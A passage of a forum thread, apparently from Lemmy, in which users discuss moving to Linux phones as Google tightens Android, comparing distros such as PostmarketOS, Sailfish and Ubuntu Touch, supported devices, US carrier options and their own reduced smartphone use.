        &lt;p&gt;On well-supported devices the performance is just like native Android, with camera support and almost everything seems to work. Waydroid also provides a full Android system if needed, again, with good performance.&lt;/p&gt;
        &lt;p&gt;In my view, this project can pave the way for Linux development for smartphones, as the user interacts with a standard Phosh desktop environment, so new apps can also be developed for the platform without the need of specialized hardware such as the Pinephone.&lt;/p&gt;
        &lt;p&gt;A good option for this could be the Thinkphone by Motorola device (codename bronco), as it is officially supported, has a good battery and a pretty recent SoC (SD8+Gen1) compared to most devices supported by Droidian/Ubuntu Touch/PostmarketOS. In my region it can be had for ~€250 brand new. When most other supported devices are Poco F1/Pixel 3a era, this is can be huge for smartphone Linux enthusiasts. Also, it’s officialy supported by LineageOS as well.&lt;/p&gt;
        &lt;p&gt;Another device, that’s even better supported by Droidian but pricier, is the Furilabs FLX1.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Please don’t be one of the 34 people that replied to tell me Linux is not ready.&lt;/p&gt;
        &lt;p&gt;I feel you! I really don’t get this non-constructive attitude that is, apparently, so common among techies. To me, it really looks like the behavior of people who refuse to get out of their comfrot zone (“I’ve always used Android/iOS, I don’t even want to imagine a world with an alternative, because unknown scares me”).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;@Ulrich I’ve tried to switch to linux phones multiple times but the thing that keeps holding me up isn’t the apps, the OS, or anything like that, though android compat layers are needed as banking, parking passes in many cities and the like you cant NOT have their stupid app these days, but the thing that keeps me from switching to a linux phone fulltime more than anything is all the open hardware absolutely SUCKS at being a phone, great at being a pda, but they put the worst speakers on them…&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;My next phone will run Linux, even if it is inconvenient.&lt;/p&gt;
        &lt;p&gt;As soon as this phone is paid off, I’ll be changing from Google Fi as well. Which sucks because it’s hella cheap.&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;I’m with you, I’ve switched all my computers to Linux for similar reasons. I bought an android phone recently and put Linux on that, although still some things to iron out such as sound and microphone input but it’s working well otherwise. Looking forward to when I can ditch my iPhone.&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;
                &lt;p&gt;same. There is one windows computer still in this house and it’s unplugged. Everything else is Linux, Android, or FreeBSD based.&lt;/p&gt;
              &lt;/item&gt;
              &lt;item&gt;
                &lt;p&gt;I’ve switched as well but didn’t realize you could put Linux on an android device. Is it a specific distro and can you throw it on an old android tablet?&lt;/p&gt;
                &lt;list rend="ul"&gt;
                  &lt;item&gt;
                    &lt;p&gt;There are several distros. You do need to ensure (as listed in the OP) that your bootloader is unlockable (listed as “OEM unlock” in Android).&lt;/p&gt;
                    &lt;list rend="ul"&gt;
                      &lt;item&gt;SailfishOS&lt;/item&gt;
                      &lt;item&gt;Ubuntu Touch&lt;/item&gt;
                      &lt;item&gt;Mobian&lt;/item&gt;
                      &lt;item&gt;PostmarketOS&lt;/item&gt;
                      &lt;item&gt;Manjaro ARM&lt;/item&gt;
                    &lt;/list&gt;
                    &lt;list rend="ul"&gt;
                      &lt;item&gt;
                        &lt;p&gt;Interesting. I’ve seen Sailfish mentioned before, I’ll look into it. I’ve got a couple old tablets to mess around with, seems like a fun project. Thanks for the info!&lt;/p&gt;
                        &lt;list rend="ul"&gt;
                          &lt;item&gt;
                            &lt;p&gt;Take a look into PostMarketOS, they are the bleeding edge for Linux mobile development. You can search on their wiki if your phone is supported.&lt;/p&gt;
                            &lt;p&gt;The other solutions listed might be more turn key but not close to mainline Linux. (Custom kernel, etc)&lt;/p&gt;
                            &lt;list rend="ul"&gt;
                              &lt;item&gt;&lt;p&gt;They don’t seem to have any supported devices apart from community contributions?&lt;/p&gt;&lt;lb/&gt;“These are the most supported devices, maintained by at least 2 people and have the functions you expect from the device running its normal OS, such as calling on a phone, working audio, and a functional UI. Besides QEMU devices, this is currently empty.”&lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt;Yeah I wasn’t kidding about bleeding edge. It’s a double edged sword. You get more compatibility across a wide range of devices but it might not be 100% polished, yet.&lt;/p&gt;&lt;p&gt;To be fair, as most things in Linux, they are community developed. The community supported devices are supported by people who are taking their personal time to develop Linux to support these devices. You can view each individual device in the wiki to see how much support they have.&lt;/p&gt;&lt;p&gt;It’s all what you’re comfortable with, I still daily drive my iPhone as I need a very reliable device for my work. But I definitely rock my Linux phone when I can.&lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
                              &lt;item&gt;
                                &lt;p&gt;Wow, surprised to see the old Samsung Galaxy S3 on there. Looks like I’ve got a project coming up&lt;/p&gt;
                              &lt;/item&gt;
                            &lt;/list&gt;
                          &lt;/item&gt;
                          &lt;item&gt;
                            &lt;p&gt;I think they are very device specific. Like only a handful of specific phones have builds for these OS.&lt;/p&gt;
                          &lt;/item&gt;
                        &lt;/list&gt;
                      &lt;/item&gt;
                      &lt;item&gt;
                        &lt;p&gt;Is it true that the top 2 in your list have the most features?&lt;/p&gt;
                      &lt;/item&gt;
                    &lt;/list&gt;
                  &lt;/item&gt;
                &lt;/list&gt;
              &lt;/item&gt;
              &lt;item&gt;
                &lt;p&gt;what phone and os do you have? im currently shopping and have always been on android; im looking for recommendations on both phones and os &amp;lt;3&lt;/p&gt;
                &lt;list rend="ul"&gt;
                  &lt;item&gt;
                    &lt;p&gt;I have the Nothing Phone 1, running my fork of Mobile NixOS. I bought it because I wanted a bit of a challenge to get it running Linux and it’s relatively newer then other better supported Linux phones. I don’t recommend it for anyone who is new to Linux.&lt;/p&gt;
                    &lt;p&gt;If you’re relatively new to Linux and want something that’s more compatible, I recommend looking at the OnePlus 6 or 6T. They have pretty good support for multiple different distros.&lt;/p&gt;
                  &lt;/item&gt;
                &lt;/list&gt;
              &lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;What options are you looking into as far as a Fi replacement? I’m also on Fi and want to ditch them, and the Pixel soon.&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;
                &lt;p&gt;I’m on Mint.&lt;/p&gt;
                &lt;p&gt;T-Mobile acquired them, per the usual bullshit, but I get 15GB a month with unlimited talk and text for “$20” a month. The catch is that you pay yearly in bulk for that price. Had it a year and change. Been solid.&lt;/p&gt;
              &lt;/item&gt;
              &lt;item&gt;
                &lt;p&gt;I’m likely going to go to t-mobile as they’re cheap from what I understand and they make up a big part of the network that google leases, along with (i think) US Cellular, or something similar.&lt;/p&gt;
                &lt;p&gt;That said, I’ve got about a year to decide, unless someone decides to hire me and then I can pay my phone off early.&lt;/p&gt;
                &lt;list rend="ul"&gt;
                  &lt;item&gt;
                    &lt;p&gt;As someone dailying a Linux phone, I will say that there were no issues getting it to work on T-Mobile. The only thing I did was manually enter the APN details, but that was an OS thing.&lt;/p&gt;
                    &lt;p&gt;From what I have seen on forums Verizon won’t let you at all, and AT&amp;amp;T might take a bit of work to get them to whitelist the IMEI on their network.&lt;/p&gt;
                    &lt;list rend="ul"&gt;
                      &lt;item&gt;
                        &lt;p&gt;at&amp;amp;t collects any and all data they can and sells it directly to law enforcment and the government btw. im pretty sure they all sell your data, but at&amp;amp;t has illegal deals with the government&lt;/p&gt;
                      &lt;/item&gt;
                    &lt;/list&gt;
                  &lt;/item&gt;
                  &lt;item&gt;
                    &lt;p&gt;Good luck! Hope you get hired soon.&lt;/p&gt;
                    &lt;list rend="ul"&gt;
                      &lt;item&gt;
                        &lt;p&gt;thanks! me too lol&lt;/p&gt;
                      &lt;/item&gt;
                    &lt;/list&gt;
                  &lt;/item&gt;
                  &lt;item&gt;
                    &lt;p&gt;go w an mvno; they’re usually cheaper and it rob the carriers of profit.&lt;/p&gt;
                    &lt;p&gt;and the carriers deserve it for blacklisting chinese smartphones from their networks in collusion with the us gov’t in order to prevent chinese tech from entering the us like they’re doing with EV’s and solar panels using tariffs.&lt;/p&gt;
                  &lt;/item&gt;
                  &lt;item&gt;
                    &lt;p&gt;My family just switched from T-Mobile, as they’ve been jacking up prices lately, and without good reason, considering other carriers have better reception anyway.&lt;/p&gt;
                    &lt;list rend="ul"&gt;
                      &lt;item&gt;
                        &lt;p&gt;What’d you switch to?&lt;/p&gt;
                        &lt;list rend="ul"&gt;
                          &lt;item&gt;
                            &lt;del rend="overstrike"&gt;apparently it needs to be said that I am not suggesting you switch to Linux on your phone today; just that development needs to accelerate.&lt;/del&gt;
                            &lt;p&gt;I switched to Visible Wireless for now.&lt;/p&gt;
                            &lt;list rend="ul"&gt;
                              &lt;item&gt;
                                &lt;p&gt;They’re asking what provider you switched to, not what phone.&lt;/p&gt;
                                &lt;list rend="ul"&gt;
                                  &lt;item&gt;
                                    &lt;p&gt;Duh, thank you. Photon makes it hard to see context now.&lt;/p&gt;
                                  &lt;/item&gt;
                                &lt;/list&gt;
                              &lt;/item&gt;
                            &lt;/list&gt;
                          &lt;/item&gt;
                        &lt;/list&gt;
                      &lt;/item&gt;
                    &lt;/list&gt;
                  &lt;/item&gt;
                &lt;/list&gt;
              &lt;/item&gt;
              &lt;item&gt;
                &lt;p&gt;I like us mobile alot. Well priced too&lt;/p&gt;
              &lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;deleted by creator&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;
                &lt;p&gt;Worth noting that some services will reject VoIP phone numbers.&lt;/p&gt;
                &lt;p&gt;JMP also explicitly states that it doesn’t work for emergency calls.&lt;/p&gt;
                &lt;list rend="ul"&gt;
                  &lt;item&gt;
                    &lt;p&gt;Do you need a phone plan at all for emergency calling? It’s required for all carriers to take 911 calls in Canada.&lt;/p&gt;
                    &lt;list rend="ul"&gt;
                      &lt;item&gt;
                        &lt;p&gt;That’s a good question. You don’t need a phone plan but I think you do still need some way to communicate with the towers. If you do like jevans (data plan only), I suspect there will be no calling functionality at all. Emergency or otherwise. But I could be wrong. Take out your SIM card and call 911 and let me know haha.&lt;/p&gt;
                        &lt;list rend="ul"&gt;
                          &lt;item&gt;
                            &lt;p&gt;It works in Canada without a SIM. I know because my son did it on his “wifi-only” tablet.&lt;/p&gt;
                          &lt;/item&gt;
                        &lt;/list&gt;
                      &lt;/item&gt;
                    &lt;/list&gt;
                  &lt;/item&gt;
                  &lt;item&gt;
                    &lt;p&gt;deleted by creator&lt;/p&gt;
                  &lt;/item&gt;
                &lt;/list&gt;
              &lt;/item&gt;
              &lt;item&gt;
                &lt;p&gt;I’ll have to look into it. 30GB isn’t bad at all. I think I have unlimited now with text and phone for only like $10 more a month. I’d have to look, it’s been a while since i’ve dealt with it.&lt;/p&gt;
              &lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;You can’t sideload in Linux.&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;&lt;p&gt;On linux it’s just called running an executable&lt;/p&gt;&lt;p&gt;Edit: As a less snarky answer, you can run Android apps natively on linux by installing Android OS in a container using something like&lt;/p&gt;&lt;del rend="overstrike"&gt;Anbox&lt;/del&gt;Waydroid.&lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Mint and US Mobile are both good alternatives to Fi. US Mobile is a bit more flexible since you can use any of the major US carriers.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;As soon as this phone is paid off&lt;/p&gt;
            &lt;p&gt;What? People finance phones? 🤣&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;
                &lt;p&gt;Yes, some of us have good credit.&lt;/p&gt;
              &lt;/item&gt;
              &lt;item&gt;
                &lt;p&gt;I don’t but it doesn’t mean I’m better than other people who do&lt;/p&gt;
              &lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;My next phone is definitely going to be a Linux phone. I don’t care if it’s ready. I’m ready.&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;Same here.&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Unfortunately there’s a lot(!) to do to make Linux enjoyable on a phone. I bought a Pinephone some years ago. And in addition to the slow hardware, the entire software/desktop experience isn’t great. While everyone else has instant messengers, Linux doesn’t have connected standby and emails and messages just don’t arrive unless the screen is on. It wastes quite some power, and there are a bazillion small little quirks and annoyances and it’s barely usable if compared to a regular smartphone. I think someone needs to invest quite some more time and money until this becomes a thing. I mean don’t get me wrong, Linux and the low-level system is awesome. And it’s brilliant on any server/laptop/desktop computer. It’s just that there’s so many things missing for a proper phone experience. And it’s not just mildly inconvenient, but like people expect instant messages to be delivered…&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;It seems like you read the title as “everyone needs to switch to Linux mobile right now” but that’s not what it says.&lt;/p&gt;
            &lt;p&gt;The point is, as you said, there’s a lot of work that needs to be done, and that work is more important now than ever.&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;
                &lt;p&gt;Sure. It’s just that the timeframe is a bit disheartening. To me… so all of this is highly subjective. We had the Nokia N900 in like 2009. And I was expecting to live the full Linux experience within a few years and those things to become a bit more affordable. And today it’s almost 16 years later and it doesn’t feel like we’ve come substantially closer. More recently we had Librem and Pine64 put some effort and publicity into it, and that’s also been 5 years. The mobile/touch desktops made some good progress. PostmarketOS is kind of nice. But there are entire layers missing like the app framework in Android which enables such app lifecycles, connected standby… Sandboxing and a fine-granular permission system for proprietary apps (or just modern mainstream usage) is kind of in its infancy. And I’m not even sure if everyone is going to use Flatpak for everything. And all of those missing things are huge undertakings.&lt;/p&gt;
                &lt;p&gt;So I’m not sure when to expect such an every-day phone… Maybe in 2030 or 2035? But that’s kind of late if the headline is “more important now, than ever”. Because all the while Google is moving more and more stuff from AOSP into their proprietary Play services and it’s getting uncomfortable for me. We have a deadline with the Google messes with the allowed apps on a phone starting 2027. And my life includes more and more mandatory apps, or I have to forfeit taking part in society, culture, convenience or riding a train… This year, Google started giving the GrapheneOS devs a hard time… Now they’re making it even more complicated.&lt;/p&gt;
                &lt;p&gt;So of course not everyone has to use it, and I’m first of all concerned with my own wellbeing. But I really don’t see a solution in the near future which is going to address the important issues if today and the next few years. So I’m a bit unsure if a Linux phone will come around and help me before it’s too late, or if I need to find other ways to deal with it.&lt;/p&gt;
                &lt;list rend="ul"&gt;
                  &lt;item&gt;
                    &lt;p&gt;True but I also never even considered it before because honestly open source Android works really great on most devices already. Now that that’s all basically disappearing, hopefully more people will be more dedicated to creating an alternative.&lt;/p&gt;
                    &lt;list rend="ul"&gt;
                      &lt;item&gt;
                        &lt;p&gt;Can you help me understand why Linux phones are the answer rather than a community maintained android fork?&lt;/p&gt;
                        &lt;p&gt;Android is already fully featured and has a solid ecosystem so it’s usable now, not in 5-10 years with less of a need for adjustment for the people who want to switch.&lt;/p&gt;
                        &lt;p&gt;Basically, why take several steps backwards and start from scratch?&lt;/p&gt;
                        &lt;list rend="ul"&gt;
                          &lt;item&gt;
                            &lt;p&gt;Because a community maintained fork wont solve the problems in the OP?&lt;/p&gt;
                            &lt;list rend="ul"&gt;
                              &lt;item&gt;
                                &lt;p&gt;I strongly disagree with this comment. I’ll answer your numbered points from the original post one by one with my perspective:&lt;/p&gt;
                                &lt;list rend="ol"&gt;
                                  &lt;item&gt;Development would happen completely in the open, since its community driven&lt;/item&gt;
                                  &lt;item&gt;A community android fork wouldn’t directly solve the issue of manufacturer locked bootloaders, but neither would Linux mobile&lt;/item&gt;
                                  &lt;item&gt;I originally messed up on this bullet point, but this is the correction - the play integrity API would be unusable on both community driven Android and Linux mobile&lt;/item&gt;
                                  &lt;item&gt;Developer verification will not apply to devices running an OS that isn’t Google certified, which a community maintained android fork would not be&lt;/item&gt;
                                &lt;/list&gt;
                                &lt;p&gt;Do you disagree with any of these? Would love to hear your thoughts&lt;/p&gt;
                                &lt;list rend="ul"&gt;
                                  &lt;item&gt;
                                    &lt;p&gt;Wow. Ok.&lt;/p&gt;
                                    &lt;p&gt;Development would happen completely in the open, since its community driven&lt;/p&gt;
                                    &lt;p&gt;All “community driven forks” are based on Google’s AOSP. None of them have the resources to develop this stuff from the ground up.&lt;/p&gt;
                                    &lt;p&gt;A community android fork wouldn’t directly solve the issue of manufacturer locked bootloaders, but neither would Linux mobile&lt;/p&gt;
                                    &lt;p&gt;No but someone would sell Linux devices if they were commercially viable, and no one would buy a Linux device with a locked bootloader.&lt;/p&gt;
                                    &lt;p&gt;the play integrity API would be unusable on both community driven Android and Linux mobile&lt;/p&gt;
                                    &lt;p&gt;You wouldn’t need it on Linux mobile because…it’s not Android.&lt;/p&gt;
                                    &lt;p&gt;Developer verification will not apply to devices running an OS that isn’t Google certified&lt;/p&gt;
                                    &lt;p&gt;I already addressed this in OP.&lt;/p&gt;
                                  &lt;/item&gt;
                                &lt;/list&gt;
                              &lt;/item&gt;
                            &lt;/list&gt;
                          &lt;/item&gt;
                        &lt;/list&gt;
                      &lt;/item&gt;
                    &lt;/list&gt;
                  &lt;/item&gt;
                &lt;/list&gt;
              &lt;/item&gt;
              &lt;item&gt;
                &lt;p&gt;So which is the best project to back?&lt;/p&gt;
                &lt;list rend="ul"&gt;
                  &lt;item&gt;
                    &lt;p&gt;I dunno! It will really require the participation of the entire community.&lt;/p&gt;
                    &lt;p&gt;Gnome has been making great progress on the graphical front.&lt;/p&gt;
                    &lt;p&gt;Notifications should be pretty simple, and probably should be provided by hardware manufacturers. But the support will need to be implemented into the apps that need them. That can potentially also fix the battery issue.&lt;/p&gt;
                    &lt;p&gt;PostmarketOS I think is probably the most mature Linux mobile package currently but I’m no expert on the subject.&lt;/p&gt;
                    &lt;list rend="ul"&gt;
                      &lt;item&gt;
                        &lt;p&gt;I’d argue that Ubuntu Touch and Sailfish are the most mature offerings. Both OSs are (or at least were at some point) developed as commercially viable alternatives to the duopoly. That gives them a headstart in terms of apps and overall pollish.&lt;/p&gt;
                        &lt;p&gt;The postmarket shells are catching up, but you still get instructions like “drag and drop a file from your file manager to open it”, which doesn’t work on a phone. Phone UX still seems like an afterthought in many cases.&lt;/p&gt;
                        &lt;p&gt;Postmarket OS is a desktop Linux system, but for phones. UT and Sailfish on the other hand are mobile OSs, that happen to use much of the same tech as desktop Linux. They are therefore much closer to the duopoly (for bettet or for worse).&lt;/p&gt;
                        &lt;list rend="ul"&gt;
                          &lt;item&gt;
                            &lt;p&gt;Great, thanks! The next step would be to figure out if either is compatible with Syncthing and GPS-guided nav…&lt;/p&gt;
                            &lt;list rend="ul"&gt;
                              &lt;item&gt;
                                &lt;list rend="ul"&gt;
                                  &lt;item&gt;
                                    &lt;p&gt;Woohoo!! Now I can’t decide between the two…&lt;/p&gt;
                                  &lt;/item&gt;
                                &lt;/list&gt;
                              &lt;/item&gt;
                            &lt;/list&gt;
                          &lt;/item&gt;
                        &lt;/list&gt;
                      &lt;/item&gt;
                    &lt;/list&gt;
                  &lt;/item&gt;
                &lt;/list&gt;
              &lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;How cool would it be to out of nowhere see Valve come out with a SteamPhone based on Arch which does everything you ever hoped for and runs on high quality hardware including all the features that others took away (colour alert pixel, 3,5mm jack, replaceable battery), complete with dual boot or a containerised Android-mode for running apps that would never work like banking or eID. Would buy instantly.&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;comparison is the thief of joy and it’s unrealistic to expect a product of grass roots community effort to compare to a product that benefits from deep pockets that can afford the finest talent and a considerably long head start.&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;
                &lt;p&gt;I’m not sure. A phone is kind of a tool, same for a computer. Ideally we weigh our options (aka compare them) and pick which suits us best. And this grass roots effort isn’t doing a half-assed job. I have almost everything available. I can do regular tasks, edit videos, do computer aided design, do heavy database stuff, run the bookkeeping for an entire mid-sized company, a server farm or almost anything I like with Free Software and Linux. I don’t think a phone is fundamentally different and I kind of have the same high expectations for that niche. We’re already doing great with lots of other things, both more niche and more ordinary stuff. And oftentimes it does not include money from tech giants.&lt;/p&gt;
              &lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Smart phones are simultaneously such a wonder of human engineering and have become such a disappointment of human greed.&lt;/p&gt;
        &lt;p&gt;This whole situation has made me just care less about my phone, and use it less in my life while I use Linux PCs much more.&lt;/p&gt;
        &lt;p&gt;I don’t see my phone as a “computer” at this point, really. It’s more of a communication appliance. If I’m launching an app that’s not texting, calling, GPS, or music, it’s probably a replacement for a website I’d normally use on a PC.&lt;/p&gt;
        &lt;p&gt;Linux phones could change this though. The idea of your PC being your docked phone would work great for most use cases. Unfortunately though, even though I would love it I don’t really see the general public jumping at the chance to get back to the desktop experience. I could maybe see a little traction in the business world.&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;I found myself using my phone less and less too, and to be honest, I’m even feeling healthier mentally. Portable devices were supposed to improve our life, not make it worse. Big tech did something really terrible to phones :(&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;
                &lt;p&gt;deleted by creator&lt;/p&gt;
              &lt;/item&gt;
              &lt;item&gt;
                &lt;p&gt;Oh same here! My reduced phone usage has been part of a much larger overall improvement in my well being and being able to live in the moment and be content.&lt;/p&gt;
                &lt;p&gt;I recently saw a video from a harvard dude talking about how we NEED to be bored. It’s when we fall into our baseline mental state and start thinking through shit and figuring life out. And not doing that can lead to anxiety and depression and other bad shit. Given my experiences, I certainly cannot disagree.&lt;/p&gt;
                &lt;list rend="ul"&gt;
                  &lt;item&gt;
                    &lt;p&gt;deleted by creator&lt;/p&gt;
                    &lt;list rend="ul"&gt;
                      &lt;item&gt;
                        &lt;p&gt;I love hearing the individual specifics. All the variety and niches that make life interesting.&lt;/p&gt;
                        &lt;p&gt;It’s funny you mention getting back into Japanese, because my big focus this year has been rebuilding and upgrading my koi pond. It would be neat to learn the language, but knowing how I function I don’t think it’s in the cards for me.&lt;/p&gt;
                        &lt;p&gt;Then for my more physical activities, that was carpentry and construction driven by the damn pond. :D&lt;/p&gt;
                        &lt;p&gt;It’s perfect for me though. I am a builder and creator to my core, and my career is in software and electronics, so outdoor wood working perfectly offsets that.&lt;/p&gt;
                        &lt;list rend="ul"&gt;
                          &lt;item&gt;
                            &lt;p&gt;deleted by creator&lt;/p&gt;
                            &lt;list rend="ul"&gt;
                              &lt;item&gt;
                                &lt;p&gt;I hope you have fun as well, whether your account is deleted or not!&lt;/p&gt;
                                &lt;p&gt;One note about the complaints and drama in response to your suggestions though: I see your instance is lemmy.ml and that fact alone will make a lot of people respond to you with hostility, regardless of what your personal political beliefs actually are.&lt;/p&gt;
                                &lt;p&gt;And I don’t know the latest of who is defederated with who, but you may also not even see some of the more decent communities.&lt;/p&gt;
                                &lt;list rend="ul"&gt;
                                  &lt;item&gt;
                                    &lt;p&gt;deleted by creator&lt;/p&gt;
                                  &lt;/item&gt;
                                &lt;/list&gt;
                              &lt;/item&gt;
                            &lt;/list&gt;
                          &lt;/item&gt;
                        &lt;/list&gt;
                      &lt;/item&gt;
                    &lt;/list&gt;
                  &lt;/item&gt;
                &lt;/list&gt;
              &lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;deleted by creator&lt;/p&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;This is pretty much how I am. Use my desktop for important things. On weekends I try to not even have my phone on my person and I check it a couple times a day while it stays in the bedroom like a house phone. Life is so much better without it.&lt;/p&gt;
            &lt;p&gt;I unfortunately still do like to take it with if walking/biking/driving but I wish I didn’t. Id like to have another phone that only makes phone calls for that but has my same number. Its funny. When I was a kid we didn’t even think about it because none of us had phones. Going on a random dirt bike ride miles away with nothing. Better (also unsafe) times.&lt;/p&gt;
            &lt;p&gt;Im tired of smartphones consuming everyone’s minds.&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;
                &lt;p&gt;Im tired of smartphones consuming everyone’s minds.&lt;/p&gt;
                &lt;p&gt;Resisting the standard smartphone addiction just makes the addiction of some others so much more apparent. My own wife is still pretty badly shackled to hers.&lt;/p&gt;
                &lt;list rend="ul"&gt;
                  &lt;item&gt;
                    &lt;p&gt;My one friend cant stop staring at his when driving. He lives near me and sometimes I wave at him driving by and hes like I never even saw you. Like dude, youre a fucking idiot.&lt;/p&gt;
                  &lt;/item&gt;
                &lt;/list&gt;
              &lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Anywhere there is freedom and thoughtful development there are corporations waiting to capitalize on it and ruin it.&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;the vast majority of commenters here either have no direct experience with a Linux phone or have seen some shallow youtube “review” of a dude swiping the same two screens left/right and extrapolate a buncha shit that has no contact with reality.&lt;/p&gt;
        &lt;p&gt;presently, and in the foreseeable future, linux phones aren’t an android alternative, they are just linux on the phone, i.e. they allow you to do linux shit on a handheld device.&lt;/p&gt;
        &lt;p&gt;like, the bleeding edge version of any variant (plasma mobile, gnome, phosh) isn’t even close to an Android phone from like 2015, let alone a modern one.&lt;/p&gt;
        &lt;p&gt;and that’s before we touch on the pillars of mobile tech like fluidity, battery efficiency, reliability, etc., none of those things are even in a remotely passable state, not to mention - using the thing to make calls. you are better off forgetting about the camera, as well.&lt;/p&gt;
        &lt;p&gt;and the reason is simple, not only is there a gargantuan discrepancy between evil corp’s resources and the predominantly unpaid enthusiasts, each dev team’s reimplementing shit that’s already solved on another platform. apple doesn’t have to do that. google as well.&lt;/p&gt;
        &lt;p&gt;then there’s the idea that the javascript-backed Gnome - that has issues running fluidly on super-capable hardware - is the basis on a low-power device on which the linux mobile phone experience is built. reinventing solved shit, but in a stupid way - THREE FINGER swipe on a phone, really?&lt;/p&gt;
        &lt;p&gt;although there’s a solid app base, the apps that are supposedly mobile friendly are few and far between, most are just downright unusable on a vertical screen and dog help you if launch an electron app. firefox, even with pmOS patches (useless without) is tiresome to use. you can forget about dating, ubering, banking, or even just using a messenger everybody else does.&lt;/p&gt;
        &lt;p&gt;if you’re squeamish about flashing custom recoveries and ROMs, the e.g. pmOS install process is way, way, way more involved and failure prone. if you go with ubuntu touch or mobian, even more so.&lt;/p&gt;
        &lt;p&gt;finally, if you’re talking about a device that you’ve grown accustomed to to the extent that you’re using it subconsciously, swiping and multitasking and such whilst walking and dodging other pedestrians - no such thing exists over here.&lt;/p&gt;
        &lt;p&gt;I’m just tying this up because I keep reading about “switching”, people are either delusional or misinformed, there’s nothing (yet) to switch to.&lt;/p&gt;
        &lt;p&gt;get a couple of $50 ex-flaghips to play with, flash lineageOS on one and pmOS on the other and that should hold you over for a coupla years.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;I’ll consider a Linux phone as long as the following are met:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Battery life is decent (for me this means a minimum of 24 hours of light use and no mystery drains).&lt;/item&gt;
          &lt;item&gt;Reliable enough to not fear for my life when traveling.&lt;/item&gt;
          &lt;item&gt;UX is polished enough to not be painful.&lt;/item&gt;
          &lt;item&gt;Email notifications and communication apps work correctly (Signal, Telegram, WhatsApp).&lt;/item&gt;
        &lt;/list&gt;
        &lt;p&gt;If these are met, I’ll buy whatever is available in a year or two.&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;UX is polished enough to not be painful&lt;/p&gt;
            &lt;p&gt;This one requirement I believe to be already met. Mobile kde, for one, is pretty nice. I believe the bottleneck of linux phones are really in the hardware&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;
                &lt;p&gt;UX is more than the UI, it’s the entire User Experience (UX). That means scaled down desktop apps are not good substitutes for proper Mobile apps.&lt;/p&gt;
              &lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;communication apps work correctly (Signal, Telegram, WhatsApp).&lt;/p&gt;
            &lt;p&gt;Google and Facebook will cooperate. WhatsApp will never work reliably.&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;&lt;p&gt;WhatsApp will never work reliably.&lt;/p&gt;&lt;p&gt;Use the web version, although you’ll need a phone to authenticate.&lt;/p&gt;&lt;lb/&gt;Better yet, move out of whatsapp (i know, network effect).&lt;list rend="ul"&gt;&lt;item&gt;&lt;p&gt;There’s also some whatsapp clients on flathub that claim to support linux mobile. Matrix bridges are also available.&lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
            &lt;/list&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;p&gt;Yeah, I wish the Pine phone battery life was a bit better. Who knows, maybe it’s improved since I last tried it&lt;/p&gt;
          &lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Send me back to the 90s with the flip phone. Old Nokia with a changeable battery, no malicious firmware that has spyware built in. It’s just a phone.&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;p&gt;i tried to do this recently but it created a lot of friction in daily life. once the masses have moved on, it’s hard to keep the old stuff, sadly. it’s really frustrating.&lt;/p&gt;
            &lt;list rend="ul"&gt;
              &lt;item&gt;
